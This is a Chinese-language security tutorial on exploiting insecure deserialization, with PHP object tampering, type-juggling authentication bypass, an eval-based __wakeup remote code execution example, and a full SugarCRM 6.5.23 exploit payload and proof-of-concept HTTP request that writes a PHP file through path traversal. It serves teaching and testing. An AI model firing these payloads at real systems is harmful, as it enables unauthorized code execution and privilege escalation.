# 利用不安全的反序列化漏洞

在本节中，我们将通过 PHP、Ruby 和 Java 反序列化的示例，教您如何利用一些常见场景。我们希望证明，利用不安全的反序列化实际上比许多人想象的要容易得多。即使是在黑盒测试中，只要您能够使用预构建的 gadget 链，情况也是如此。

我们还将指导您创建自己的高严重性反序列化攻击的过程。虽然这些通常需要源代码访问权限，但一旦您理解了基本概念，它们也可能比您想象的更容易学习。

> **注意：** 尽管许多示例基于 PHP，但大多数利用技术同样适用于其他语言。

## 操作序列化对象

利用某些反序列化漏洞可能像更改序列化对象中的属性一样简单。由于对象状态被持久化，您可以研究序列化数据以识别和编辑有趣的属性值。然后，您可以通过反序列化过程将恶意对象传入网站。这是基本反序列化漏洞利用的第一步。

总的来说，在操作序列化对象时有两种方法。您可以直接在其字节流形式中编辑对象，也可以使用相应语言编写简短脚本自行创建和序列化新对象。处理二进制序列化格式时，后一种方法通常更容易。

### 修改对象属性

篡改数据时，只要攻击者保留有效的序列化对象，反序列化过程就会创建一个具有修改后属性值的服务器端对象。

举个简单例子，假设一个网站使用序列化的 `User` 对象在 Cookie 中存储有关用户会话的数据。如果攻击者在 HTTP 请求中发现此序列化对象，他们可能会解码它以找到以下字节流：

```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

`isAdmin` 属性是明显的兴趣点。攻击者只需将属性的布尔值更改为 `1`（true），重新编码对象，并使用此修改后的值覆盖其当前 Cookie。单独来看，这没有效果。但是，假设网站使用此 Cookie 检查当前用户是否有权访问某些管理功能：

```php
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
    // allow access to admin interface
}
```

此易受攻击的代码会根据 Cookie 中的数据实例化一个 `User` 对象，包括攻击者修改的 `isAdmin` 属性。在任何时候都不会检查序列化对象的真实性。然后，这些数据被传递到条件语句中，在这种情况下，将导致简单的权限提升。

这种简单场景在实际中并不常见。但是，通过这种方式编辑属性值演示了访问不安全反序列化暴露的大量攻击面的第一步。

### 修改数据类型

我们已经看到如何修改序列化对象中的属性值，但也可以提供意外的数据类型。

基于 PHP 的逻辑特别容易受到此类操纵的影响，因为其松散比较运算符（`==`）在比较不同数据类型时的行为。例如，如果您对整数和字符串进行松散比较，PHP 将尝试将字符串转换为整数，这意味着 `5 == "5"` 计算结果为 `true`。

不同寻常的是，这也适用于任何以数字开头的字母数字字符串。在这种情况下，PHP 将根据开头的数字将整个字符串转换为整数值。字符串的其余部分被完全忽略。因此，`5 == "5 of something"` 实际上被视为 `5 == 5`。

同样，在 PHP 7.x 及更早版本中，比较 `0 == "Example string"` 计算结果为 `true`，因为 PHP 将整个字符串视为整数 `0`。

考虑一个情况，即松散比较运算符与来自反序列化对象的用户可控数据结合使用。这可能导致危险的逻辑缺陷。

```php
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
    // log in successfully
}
```

假设攻击者修改了 password 属性，使其包含整数 `0` 而不是预期的字符串。只要存储的密码不以数字开头，条件将始终返回 `true`，从而实现身份验证绕过。请注意，这之所以可能，是因为反序列化保留了数据类型。如果代码直接从请求中获取密码，则 `0` 将被转换为字符串，条件将评估为 `false`。
- 或者，设置布尔类型 true `b:1;`

> **注意：** 在 PHP 8 及更高版本中，`0 == "Example string"` 比较计算结果为 `false`，因为在比较期间字符串不再**隐式转换**为 `0`。因此，此漏洞利用在这些 PHP 版本上不可行。
>
> 在 PHP 8 中，以数字开头的字母数字字符串的比较行为保持不变。因此，`5 == "5 of something"` 仍被视为 `5 == 5`。

请注意，在修改任何序列化对象格式中的数据类型时，务必记得更新序列化数据中的类型标签和长度指示符。否则，序列化对象将损坏，无法反序列化。

直接处理二进制格式时，我们建议使用 BApp 商店中的 Hackvertor 扩展。使用 Hackvertor，您可以将序列化数据作为字符串进行修改，它将自动更新二进制数据并相应地调整偏移量。这可以节省大量手动工作。

## 利用应用程序功能

除了检查属性值外，网站的功能还可能对反序列化对象的数据执行危险操作。在这种情况下，您可以使用不安全的反序列化传入意外数据，并利用相关功能造成损害。

例如，作为网站“删除用户”功能的一部分，用户的个人资料图片通过访问 `$user->image_location` 属性中的文件路径来删除。如果此 `$user` 是从序列化对象创建的，攻击者可以通过传入修改后的对象（将 `image_location` 设置为任意文件路径）来利用此漏洞。删除自己的用户帐户也将同时删除此任意文件。

此示例依赖攻击者通过用户可访问的功能手动调用危险方法。然而，当您创建自动将数据传递到危险方法的漏洞利用时，不安全的反序列化会变得更加有趣。这可以通过使用“魔术方法”来实现。

## 魔术方法

魔术方法是特殊的方法子集，您无需显式调用。相反，只要特定事件或场景发生，它们就会自动调用。魔术方法是各种语言中面向对象编程的常见功能。它们有时通过在方法名前添加双下划线或将其括在双下划线中来表示。

开发人员可以向类中添加魔术方法，以预先确定相应事件或场景发生时应执行的代码。魔术方法何时以及为何被调用因方法而异。PHP 中最常见的示例之一是 `__construct()`，它在实例化类的对象时被调用，类似于 Python 的 `__init__`。通常，此类构造函数魔术方法包含用于初始化实例属性的代码。但是，开发人员可以自定义魔术方法以执行任何他们想要的代码。

> 反序列化时并不会自动调用构造魔术方法，而是构建对象并设置特定字段。构造魔术方法仅在构建对象操作 `new 对象` 时自动调用 

魔术方法被广泛使用，本身并不代表漏洞。但是，当它们执行的代码处理攻击者可控制的数据（例如来自反序列化对象）时，它们可能变得危险。攻击者可以利用这一点在相应条件满足时自动调用反序列化数据上的方法。

PHP 对象注入的利用取决于这些魔术方法在代码中的使用方式。它们被称为“魔术方法”，是因为它们不是显式调用的，而是针对某些事件自动触发的。例如，当使用 `unserialize()` 反序列化对象时，会执行 `__wakeup()` 方法；而 `__destruct()` 方法则在对象即将被垃圾回收器移除时触发（因为没有引用指向该对象）。

某些语言具有在反序列化过程中**自动**调用的魔术方法（它们被称为“魔术方法”，是因为它们不是显式调用的，而是针对某些事件自动触发）。例如：PHP 的反序列化方法 `unserialize()` 查找并调用对象的 `__wakeup()` 魔术方法；而 `__destruct()` 方法则在对象即将被垃圾回收器移除时触发（因为没有引用指向该对象）。魔术方法以双下划线定义。

在 Java 反序列化中，同样适用于 `ObjectInputStream.readObject()` 方法，该方法用于从初始字节流读取数据，并本质上充当“重新初始化”序列化对象的构造函数。但是，`Serializable` 类也可以声明自己的 `readObject()` 方法，如下所示：

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}
```

以这种方式声明的 `readObject()` 方法充当在反序列化期间调用的魔术方法。这允许类更密切地控制其自身字段的反序列化。

您应密切关注任何包含这些魔术方法的类。它们允许您在对象完全反序列化之前将数据从序列化对象传递到网站的代码中。这是创建更高级漏洞利用的起点。

### 示例：PHP __wakeup()

例如，考虑这个易受攻击的代码示例，取自https://www.owasp.org/index.php/PHP_Object_Injection：

```php
① class Example2
{
    private $hook;
    function __construct(){
        // some PHP code...
    }
    function __wakeup(){
        ② if (isset($this->hook)) eval($this->hook);
    }
}
// some PHP code...
③ $user_data = unserialize($_COOKIE['data']);
```

该代码声明了一个名为`Example2`的类。它有一个`$hook`属性和两个方法：`__construct()`和`__wakeup()`①。如果`$hook`不为空，`__wakeup()`函数会将`$hook`中存储的字符串作为PHP代码执行②。PHP `eval()`函数接收字符串并将字符串内容作为PHP代码运行。然后，程序对用户提供的名为`data`的Cookie执行`unserialize()`③。

在这里，你可以实现RCE，因为代码将用户提供的对象传递给`unserialize()`，并且存在一个对象类`Example2`，其魔术方法在对象实例化时自动对用户提供的输入运行`eval()`。

要利用此RCE，你需要将`data` Cookie设置为序列化的`Example2`对象，并将`hook`属性设置为任何你想要执行的PHP代码。你可以使用以下代码片段生成序列化对象：

```php
class Example2
{
    private $hook = "phpinfo();";
}
print ① urlencode(serialize(new Example2));
```

在打印对象之前，我们需要对其进行URL编码①，因为我们将通过Cookie注入对象。将此代码生成的字符串传递到`data` Cookie中将导致服务器执行PHP代码`phpinfo();`，该代码输出服务器上PHP配置的信息。`phpinfo()`函数通常用作漏洞报告中的概念验证函数，以证明成功的PHP命令注入。以下是此攻击期间目标服务器上发生的详细情况：

1. 序列化的`Example2`对象作为`data` Cookie传入程序。
2. 程序对`data` Cookie调用`unserialize()`。
3. 因为`data` Cookie是一个序列化的`Example2`对象，`unserialize()`实例化一个新的`Example2`对象。
4. `unserialize()`函数看到`Example2`类实现了`__wakeup()`，因此调用`__wakeup()`。
5. `__wakeup()`函数查找对象的`$hook`属性，如果它不是NULL，则运行`eval($hook)`。
6. `$hook`属性不是NULL，因为它被设置为`phpinfo();`，因此运行`eval("phpinfo();")`。
7. 你通过执行放在`data` Cookie中的任意PHP代码实现了RCE。

### 使用其他魔术方法

- `__toString()`，仅在对象被视为字符串时调用。它允许一个类决定当其对象之一被视为字符串时如何反应。例如，它可以决定如果对象被传递给`echo()`或`print()`函数时显示什么

- `__call()`，当调用未定义的方法时被调用。例如，调用`$object->undefined($args)`将变成`$object->__call('undefined', $args)`。同样，此魔术方法的可利用性在很大程度上取决于其实现方式。有时，当应用程序代码包含错误或允许用户定义要调用的方法名称时，攻击者可以利用此魔术方法。

- `__get()`，当读取对象的属性无法访问时。例如 `$对象->无法访问的属性`

PHP 文档包含所有[魔术方法的非详尽列表](https://www.php.net/manual/en/language.oop5.magic.php) 。


## 注入任意对象

正如我们所见，有时可以通过简单地编辑网站提供的对象来利用不安全的反序列化。但是，注入任意对象类型可以开辟更多可能性。

在面向对象编程中，对象可用的方法由其类决定。因此，如果攻击者可以操纵作为序列化数据传入的对象的类，他们就可以影响反序列化之后甚至期间执行的代码。

反序列化方法通常不会检查它们正在反序列化的内容。这意味着您可以传入网站可用的任何可序列化类的对象，并且该对象将被反序列化。这有效地允许攻击者创建任意类的实例。该对象不是预期类的事实并不重要。意外对象类型可能会导致应用程序逻辑中的异常，但恶意对象届时已经被实例化。

如果攻击者可以访问源代码，他们可以详细研究所有可用的类。为了构建简单的漏洞利用，他们会寻找包含反序列化魔术方法的类，然后检查其中是否有任何类对可控数据执行危险操作。然后，攻击者可以传入此类的序列化对象，以使用其魔术方法进行漏洞利用。

> 探测到的任意使用序列化的端点，均可作反序列化注入任意对象的入口（判断发生在反序列化后，此时反序列化已完成）

包含这些反序列化魔术方法的类也可用于发起更复杂的攻击，涉及一系列方法调用，称为“gadget 链”。


## 示例：SugarCRM 中的 PHP 对象注入

现在让我们考虑一个 SugarCRM 6.5.23 版本的真实示例，该版本存在 PHP 对象注入漏洞。该漏洞存在于 REST API 端点中，一旦被利用，攻击者可以执行任意 PHP 代码。让我们检查位于 `service/core/REST/SugarRestSerialize.php` 下的易受攻击代码。

**SugarCRM 中的易受攻击代码**
```php
function serve() {
    $GLOBALS['log']->info('Begin: SugarRestSerialize->serve');
    // 保存载荷
    $data = !empty($_REQUEST['rest_data']) ? $_REQUEST['rest_data'] : "";
    // 如果请求方法无效则抛出异常
    if(empty($_REQUEST['method']) || !method_exists($this->implementation, $_REQUEST['method'])) {
        $er = new SoapError();
        $er->set_error('invalid_call');
        $this->fault($er);
    } else {
        $method = $_REQUEST['method'];
        // 对载荷进行反序列化
        $data = unserialize(from_html($data)); // 易受攻击的行
        if(!is_array($data)) $data = array($data);
        $GLOBALS['log']->info('End: SugarRestSerialize->serve');
        return call_user_func_array(array($this->implementation, $method), $data);
    }
}
```

SugarCRM 中的漏洞在用户提供的输入被传递给 `rest_data` 参数，随后赋值给 `$data` 变量时触发。如果 `input_type` 参数设置为 `serialize`，则该变量随后传递给 `unserialize()` 函数。

为了进行利用，`method` 参数必须被赋值为一个有效的 API 方法，端点将执行该方法，例如 `login`。这些有关有效方法和参数的信息（包括 `input_type` 和 `rest_data`）已从 SugarCRM API 文档中获得 [https://docs.suitecrm.com/developer/api/api-4_1/]。

> `input_type` 参数并未在示例代码中展现，参见 API 文档

基于此，我们需要以下 URL 来构造请求：

### 输入参数

- `method`：要调用的 API 方法，此处为 `login`。
- `input_type`：必须设置为 `serialize`，以告知应用程序 `rest_data` 参数将包含序列化数据。
- `rest_data`：包含攻击者的有效载荷，即精心构造的序列化对象，旨在利用 `unserialize()` 调用。

让我们基于上述输入构造一个基本请求：

**请求**
```http
POST /SugarCRM6.5.2/service/v4/rest.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close

method=login&input_type=Serialize&rest_data=Serialized_exploit_payload
```

### 寻找魔术方法

我们的下一步是找到一个合适的魔术方法。`SugarCacheFile` 类具有一个 `__destruct()` 方法，如果 `_cacheChanged` 属性为 true，该方法会将数据写入文件。当该类的对象被销毁时（通常在执行结束时），会自动调用此方法。

**代码**
```php
public function __destruct()
{
    parent::__destruct();
    if ($this->_cacheChanged)
        sugar_file_put_contents(sugar_cached($this->_cacheFileName), serialize($this->_localStore));
}
```

目标是构造一个序列化对象，当反序列化时，会构建一个 `SugarCacheFile` 对象，其属性能够欺骗 `__destruct()` 方法实现任意文件写入。让我们进一步剖析 `__destruct` 方法：

- `__destruct` 方法负责写入由 `_cacheFileName` 属性命名的文件。
- 仅当 `_cacheChanged` 为 true 时才执行写入操作。
- 写入的内容是 `_localStore` 的序列化版本。

基于这些信息，可以合理地假设 `_cacheFileName` 将包含文件名及路径，如 `../custom/tmgm.php`，而 `localStore` 将包含我们的有效载荷，即 `<?PHP phpinfo();?>`，该内容将被写入文件。因此，当对象被销毁时，如果 `_cacheChanged` 为 true，`__destruct` 方法会将 `_localStore` 的内容写入 `_cacheFileName` 指定的文件。

基于此，我们的序列化有效载荷如下所示：

**有效载荷**
```php
O:14:"SugarCacheFile":3:{
    s:17:"\00*\00_cacheFileName";s:17:"../custom/tmgm.php";
    s:16:"\00*\00_cacheChanged";b:1;
    s:14:"\00*\00_localStore";s:19:"<?php phpinfo();?>";
}
```

有效载荷的分解：

- `O:14:"SugarCacheFile":3:`
    指定一个对象，类名为 `SugarCacheFile`，后跟 3 个属性。
- `s:17:"\00*\00_cacheFileName";s:17:"../custom/tmgm.php";`
    属性设置为字符串，路径为 `../custom/tmgm.php`。
- `s:16:"\00*\00_cacheChanged";b:1;`
    属性 `_cacheChanged` 是布尔类型，设置为 true。
- `s:14:"\00*\00_localStore";s:19:"<?php phpinfo();?>";`
    属性 `_localStore` 是一个长度为 19 的字符串，包含我们的 PHP 有效载荷，该载荷将被上传。

注意：属性名称前的 `\00*\00` 为 `SugarCacheFile` 类中对这些属性的 `protected` 声明 。这意味着该属性或方法只能从类自身内部或继承的子类中访问。

基于此信息，最终请求如下所示：

**POC**
```http
POST /SugarCRM6.5.2/service/v4/rest.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Content-Length: 363
Connection: close

method=login&input_type=Serialize&rest_data=O:+14:"SugarCacheFile":23:{S:17:"\00*\00_cacheFileName";s:18:"../custom/tmgm.php";S:16:"\00*\00_cacheChanged";b:1;S:14:"\00*\00_localStore";a:1:{i:0;s:18:"<?php phpinfo();?>";}}
```

执行此请求后，`tmgm.php` 将被上传到 `custom` 目录下，其中包含我们的有效载荷，该载荷将显示 PHPINFO 文件的内容。

## 找到你的第一个不安全的反序列化漏洞

1. **如果你能获得应用程序源代码**，在源代码中搜索接受用户输入的反序列化函数。
2. **如果你无法获得源代码**，寻找传递到应用程序中的大型数据块。这些可能表示被编码的序列化对象。
3. **另外**，寻找可能需要反序列化用户提供的对象的功能，如数据库输入、身份验证令牌和HTML表单参数。
4. **如果序列化对象包含有关用户身份的信息**，尝试篡改找到的序列化对象，查看你是否可以实现身份验证绕过。
5. **看看你是否可以将该缺陷提升为SQL注入或远程代码执行**。
